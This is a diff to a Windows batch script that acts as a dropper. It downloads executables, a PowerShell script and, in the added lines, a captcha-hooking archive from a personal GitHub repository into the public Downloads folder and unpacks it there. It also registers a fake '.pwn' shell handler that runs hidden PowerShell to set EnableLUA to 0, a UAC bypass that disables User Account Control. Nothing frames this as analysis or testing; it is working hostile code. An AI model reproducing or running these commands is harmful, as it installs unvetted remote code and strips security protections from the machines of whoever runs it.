@@ -4,6 +4,8 @@ powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarro
 cls
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/msedgedriver.exe" -OutFile "C:\Users\Public\Downloads\msedgedriver.exe";
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/main.exe" -OutFile "C:\Users\Public\Downloads\main.exe";
+powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/AnyCaptchaCallbackHooker_Unpacked.zip" -OutFile "C:\Users\Public\Downloads\AnyCaptchaCallbackHooker_Unpacked.zip";
+powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\AnyCaptchaCallbackHooker_Unpacked.zip -DestinationPath C:\Users\Public\Downloads
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/code.ps1" -OutFile "C:\Users\Public\Downloads\code.ps1";
 cls
 powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System EnableLUA 0""" -Force
